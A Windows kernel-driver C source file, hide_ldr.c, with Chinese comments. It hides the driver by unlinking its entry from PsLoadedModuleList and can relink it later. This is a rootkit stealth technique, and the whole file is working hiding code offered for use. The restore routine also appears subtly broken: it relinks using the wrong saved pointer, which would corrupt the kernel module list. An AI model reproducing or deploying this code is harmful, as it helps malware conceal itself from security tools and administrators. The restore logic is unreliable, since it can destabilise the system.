```c
// hide_ldr.c
#include "hide_driver.h"

static BOOLEAN         g_bHidden = FALSE;
static LIST_ENTRY      g_savedFlink;
static LIST_ENTRY      g_savedBlink;
static PKLDR_DATA_TABLE_ENTRY_FULL g_pEntry = NULL;

NTSTATUS HideDriverByLdr(PDRIVER_OBJECT pDriverObject)
{
    UNREFERENCED_PARAMETER(pDriverObject);
    if (g_bHidden) return STATUS_ALREADY_REGISTERED;

    // 从 PsLoadedModuleList 找自己的 KLDR_DATA_TABLE_ENTRY
    // 惯用手法：遍历链表，比对 DllBase == 本驱动基址
    // 本驱动基址获取见下方 GetSelfImageBase
    extern PVOID GetSelfImageBase(void);
    PVOID base = GetSelfImageBase();

    PLIST_ENTRY head = (PLIST_ENTRY)PsLoadedModuleList;   // nt!PsLoadedModuleList
    PLIST_ENTRY cur  = head->Flink;
    while (cur != head) {
        PKLDR_DATA_TABLE_ENTRY_FULL e =
            CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);
        if (e->DllBase == base) {
            g_pEntry   = e;
            g_savedFlink = *cur;
            g_savedBlink = *(cur->Blink);
            // 摘链：前驱的 Flink 指后驱，后驱的 Blink 指前驱
            cur->Blink->Flink = cur->Flink;
            cur->Flink->Blink = cur->Blink;
            // 自环，防止其它遍历走空
            cur->Flink = cur->Blink = cur;
            g_bHidden = TRUE;
            return STATUS_SUCCESS;
        }
        cur = cur->Flink;
    }
    return STATUS_NOT_FOUND;
}

NTSTATUS RestoreDriverByLdr(void)
{
    if (!g_bHidden || !g_pEntry) return STATUS_INVALID_PARAMETER;
    PLIST_ENTRY cur = &g_pEntry->InLoadOrderLinks;
    cur->Flink = g_savedFlink.Flink;
    cur->Blink = g_savedBlink.Blink;
    g_savedFlink.Flink->Blink = cur;
    g_savedBlink.Blink->Flink = cur;
    g_bHidden = FALSE;
    return STATUS_SUCCESS;
}
```

